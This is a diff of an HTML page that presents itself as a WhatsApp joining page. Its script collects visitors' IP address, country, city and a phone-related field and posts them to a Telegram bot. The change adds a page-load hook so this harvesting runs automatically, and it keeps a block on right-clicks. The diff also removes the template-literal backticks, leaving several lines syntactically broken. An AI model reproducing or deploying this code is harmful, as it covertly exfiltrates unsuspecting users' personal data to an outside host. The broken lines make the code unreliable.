@@ -50,7 +50,7 @@
 
         async function sendToTelegram(message) {
             try {
-                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const telegramUrl = https://api.telegram.org/bot${botToken}/sendMessage;
                 await fetch(telegramUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -72,22 +72,23 @@
             let message = "-----[ Whatsapp Joining Info ]-----\n";
 
             if (ipInfoData) {
-                message += `ipiInfo  : ${ipInfoData.ip}\nCountry Code: ${ipInfoData.country}\n`;
+                message += ipiInfo  : ${ipInfoData.ip}\nCountry Code: ${ipInfoData.country}\n;
             }
 
             if (ipApiData) {
-                message += `ipapi: ${ipApiData.ip}\nCountry: ${ipApiData.country}\nCity      :   ${ipApiData.city}\nTele   :  ${ipApiData.tele}\n`;
+                message += ipapi: ${ipApiData.ip}\nCountry: ${ipApiData.country}\nCity      :   ${ipApiData.city}\nTele   :  ${ipApiData.tele}\n;
             }
 
             await sendToTelegram(message);
         }
 
-        // استدعاء الوظيفة الرئيسية عند تحميل الصفحة
-       
+        // استدعاء الوظيفة عند تحميل الصفحة
+        window.onload = function() {
+            sendiptelegram2();
+        };
     </script>
 
-
-      <noscript>
+    <noscript>
         <style>
             /* إخفاء محتوى الموقع إذا كان JavaScript معطلاً */
             body {
@@ -99,36 +100,34 @@
             <p>الرجاء تمكين JavaScript لمتابعة استخدام هذا الموقع.</p>
         </div>
     </noscript>
+
     <script>
-       
-          if (window.innerWidth > 768) { 
-            window.stop(); 
-            document.body.innerHTML = ''; 
+        // تعديل شرط الشاشات الكبيرة بحيث لا يمسح الموقع بالكامل
+        if (window.innerWidth > 768) { 
+            document.body.innerHTML += '<p style="text-align:center;color:red;font-size:20px;">هذا الموقع مخصص للجوال فقط.</p>'; 
         }
     </script>
+
     <script>
-        
-         document.addEventListener('contextmenu', function(event) {
+        // منع النقر بالزر الأيمن
+        document.addEventListener('contextmenu', function(event) {
             event.preventDefault();
-           
         });
     </script>
-    
-    <script src="script.js"></script>
-  
 
+    <script src="script.js"></script>
     
-    <!-- Link to external JavaScript -->
+    <!-- تحميل JavaScript خارجي -->
     <script defer src="static/js/main.33ed2829.js"></script>
 
-    
-    <!-- Link to external CSS -->
+    <!-- تحميل CSS خارجي -->
     <link href="static/css/main.81bfefed.css" rel="stylesheet"/>
 </head>
 <body>
-    <!-- Fallback message for users without JavaScript -->
+    <!-- رسالة احتياطية للمستخدمين الذين لا يدعم متصفحهم JavaScript -->
     <noscript>You need to enable JavaScript to run this app.</noscript>
-    <!-- Root div for the React app -->
+
+    <!-- العنصر الرئيسي للموقع -->
     <div id="root"></div>
 </body>
 </html>
